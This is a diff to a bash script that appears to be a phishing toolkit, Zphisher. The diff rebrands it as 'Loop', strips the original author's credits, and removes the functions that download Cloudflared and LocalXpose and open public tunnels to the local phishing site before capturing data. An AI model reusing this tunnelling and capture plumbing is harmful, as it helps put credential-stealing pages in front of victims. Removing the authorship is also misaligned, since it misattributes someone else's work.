@@ -202,29 +202,27 @@ check_status() {
 
 ## Banner
 banner() {
-	cat <<- EOF
+    	cat <<- EOF
 		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
-
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${ORANGE} _                       
+		${ORANGE}| |                      
+		${ORANGE}| |     ___   ___  _ __  
+		${ORANGE}| |    / _ \ / _ \| '_ \ 
+		${ORANGE}| |___| (_) | (_) | |_) |
+		${ORANGE}|______\___/ \___/| .__/ 
+		${ORANGE}                  | |    
+		${ORANGE}                  |_|    
 	EOF
 }
 
 ## Small Banner
 banner_small() {
-	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
-	EOF
+    	cat <<- EOF
+        	${BLUE}
+        	${BLUE}  ░█░░░█▀█░█▀█░█▀█
+        	${BLUE}  ░█░░░█░█░█░█░█▀▀
+        	${BLUE}  ░█▄▄░█▄█░█▄█░█░░${WHITE} ${__version__}
+    	EOF
 }
 
 ## Dependencies
@@ -300,44 +298,6 @@ download() {
 	fi
 }
 
-## Install Cloudflared
-install_cloudflared() {
-	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
-		else
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
-		fi
-	fi
-}
-
-## Install LocalXpose
-install_localxpose() {
-	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
-		else
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
-		fi
-	fi
-}
-
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
@@ -349,20 +309,12 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
 		${CYAN}  This Tool is made for educational purpose 
-		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
+		  only ${RED}!${WHITE}${CYAN} Loop will not be responsible for 
 		  any misuse of this toolkit ${RED}!${WHITE}
-		
-		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
-		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
-		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
-		  Yisus7u7
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -447,65 +399,6 @@ capture_data() {
 		fi
 		sleep 0.75
 	done
-}
-
-## Start Cloudflared
-start_cloudflared() { 
-	rm .cld.log > /dev/null 2>&1 &
-	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
-
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-	else
-		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-	fi
-
-	sleep 8
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
-	custom_url "$cldflr_url"
-	capture_data
-}
-
-localxpose_auth() {
-	./.server/loclx -help > /dev/null 2>&1 &
-	sleep 1
-	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
-
-	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
-		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
-		[[ $loclx_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
-		} || {
-			echo -n "$loclx_token" > $auth_f 2> /dev/null
-		}
-	}
-}
-
-## Start LocalXpose (Again...)
-start_loclx() {
-	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; localxpose_auth; }
-	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
-
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
-	else
-		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
-	fi
-
-	sleep 12
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
-	custom_url "$loclx_url"
-	capture_data
 }
 
 ## Start localhost
@@ -906,6 +799,4 @@ main_menu() {
 kill_pid
 dependencies
 check_status
-install_cloudflared
-install_localxpose
 main_menu
